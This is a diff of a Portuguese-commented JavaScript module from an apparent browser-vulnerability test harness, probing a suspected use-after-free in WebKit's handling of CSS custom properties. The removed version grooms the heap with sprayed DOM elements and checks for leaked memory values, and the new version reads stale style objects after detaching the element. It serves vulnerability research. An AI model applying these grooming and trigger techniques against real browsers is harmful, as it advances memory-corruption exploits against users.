@@ -1,72 +1,103 @@
-import { Groomer } from '../mod_groomer.js';
+/**
+ * SC_CSS_CUSTOM_PROP.JS
+ * Categoria : DOM/STYLE — Use-After-Free / Type Confusion
+ * Alvo      : WebCore::CSSCustomPropertyValue / StyleProperties
+ * Técnica   : Lê e modifica CSS custom properties (--var) num elemento
+ *             desanexado enquanto o motor tenta recalcular o estilo.
+ *             O CSSStyleDeclaration pode manter ponteiro stale para o
+ *             PropertySet do C++ após o elemento ser coletado.
+ * Referência: Padrão de bug em StyleProperties lifecycle no WebKit
+ */
 
 export default {
-    id:       'CSS_CUSTOM_PROPERTY_UAF',
-    category: 'DOM',
-    risk:     'HIGH',
-    description:
-        'UAF no CSS StyleResolver. Cria uma dependência de variáveis customizadas entre Pai e Filho. ' +
-        'O Pai é removido da árvore durante a resolução do computed style do Filho, forçando ' +
-        'a leitura de um objeto ComputedStyle libertado na memória nativa.',
+    id:          'CSS_CUSTOM_PROP_UAF',
+    category:    'DOM/STYLE',
+    risk:        'MEDIUM',
+    description: 'CSSStyleDeclaration retém ponteiro para PropertySet '
+                + 'de elemento desanexado. Testa leitura de --custom-var pós-free.',
 
-    setup: function() {
-        this.results = {};
-        this.sandbox = document.getElementById('groomer-sandbox');
-        
-        // O Pai define a variável
-        this.parent = document.createElement('div');
-        this.parent.style.setProperty('--toxic-var', '1337px');
-        
-        // O Filho herda e usa a variável
-        this.child = document.createElement('div');
-        this.child.style.width = 'var(--toxic-var)';
-        
-        this.parent.appendChild(this.child);
-        this.sandbox.appendChild(this.parent);
-        
-        void this.parent.offsetWidth; // Constrói a árvore
+    /* ── estado interno ──────────────────────────────────────────────── */
+    _el:       null,
+    _clone:    null,
+    _computed: null,
+
+    supported: function() {
+        return typeof CSS !== 'undefined'
+            && typeof CSS.supports === 'function'
+            && CSS.supports('--x', '1');
     },
 
-    trigger: function() {
+    /* ── setup ──────────────────────────────────────────────────────── */
+    setup: async function() {
+        this._el = document.createElement('div');
+        // Define várias custom properties com valores intencionais
+        this._el.style.setProperty('--uaf-int',    '42');
+        this._el.style.setProperty('--uaf-color',  '#deadbe');
+        this._el.style.setProperty('--uaf-calc',   'calc(10px + 5%)');
+        this._el.style.setProperty('--uaf-string', '"canary_value"');
+        this._el.style.setProperty('--uaf-list',   '1 2 3 4');
+
+        document.body.appendChild(this._el);
+
+        // Clona para ter referência ao CSSStyleDeclaration separado
+        this._clone = this._el.cloneNode(true);
+
+        // Obtém ComputedStyle ANTES de remover
+        this._computed = window.getComputedStyle(this._el);
+
+        void this._el.offsetWidth; // força layout
+        await new Promise(r => setTimeout(r, 0));
+    },
+
+    /* ── trigger ─────────────────────────────────────────────────────── */
+    trigger: async function() {
+        // Remove do DOM — libera o nó do render tree
+        this._el.remove();
+
+        // Força recálculo de estilo no documento (pode liberar o PropertySet)
+        document.body.style.setProperty('--uaf-trigger', Date.now().toString());
+        void document.body.offsetHeight;
+
+        // Tenta sobrescrever a custom property no elemento desanexado
         try {
-            // O CSSOM C++ é chamado para resolver o filho
-            let cs = window.getComputedStyle(this.child);
-            
-            // O GATILHO: Destruímos o pai síncronamente.
-            // Em navegadores antigos, o ponteiro de resolução fica órfão.
-            this.parent.remove();
-            
-            // Fragmentamos a memória para corromper o ComputedStyle do pai
-            let trash = Groomer.sprayDOM('audio', 200);
+            this._el.style.setProperty('--uaf-int', '0xDEADBEEF');
+        } catch(_) {}
 
-            // A BOMBA: Lemos o valor. O C++ vai à memória do pai (agora corrompida) tentar ler '1337px'
-            this.results.leakedValue = cs.getPropertyValue('width');
-        } catch(e) {
-            this.results.error = e.message;
-        }
+        await new Promise(r => setTimeout(r, 0));
     },
 
+    /* ── probes ──────────────────────────────────────────────────────── */
     probe: [
-        s => s.results.error || 'Resolução CSS Concluída',
-        
-        s => {
-            let val = s.results.leakedValue;
-            if (val) {
-                // Se leu '1337px', o WebKit protegeu bem. Se retornar vazio, mitigou.
-                // Se retornar lixo, temos Leak! Extraímos os números.
-                if (val !== '1337px' && val !== 'auto' && val !== '') {
-                    let num = parseFloat(val);
-                    if (!isNaN(num) && num > 2000) return num; // Retorna para acionar STALE DATA
-                }
-            }
-            return 0; // Seguro
-        }
+        // [0-4] leitura das custom props via style inline (objeto desanexado)
+        s => s._el.style.getPropertyValue('--uaf-int'),
+        s => s._el.style.getPropertyValue('--uaf-color'),
+        s => s._el.style.getPropertyValue('--uaf-calc'),
+        s => s._el.style.getPropertyValue('--uaf-string'),
+        s => s._el.style.getPropertyValue('--uaf-list'),
+
+        // [5-7] leitura via ComputedStyle obtida antes da remoção
+        s => s._computed.getPropertyValue('--uaf-int'),
+        s => s._computed.getPropertyValue('--uaf-color'),
+        s => typeof s._computed.getPropertyValue('--uaf-calc'),
+
+        // [8-10] estado do elemento
+        s => s._el.isConnected,
+        s => s._el.style.length,
+        s => s._el.style.cssText.length,
+
+        // [11-12] clone não deve ter sido afetado
+        s => s._clone.style.getPropertyValue('--uaf-int'),
+        s => s._clone.style.length,
+
+        // [13] contagem de propriedades no style object
+        s => s._el.style.length,
     ],
 
-    cleanup: function() {
-        try { this.parent.remove(); this.child.remove(); } catch(e) {}
-        this.parent = null;
-        this.child = null;
-        this.results = {};
+    /* ── cleanup ─────────────────────────────────────────────────────── */
+    cleanup: async function() {
+        document.body.style.removeProperty('--uaf-trigger');
+        this._el       = null;
+        this._clone    = null;
+        this._computed = null;
     }
 };
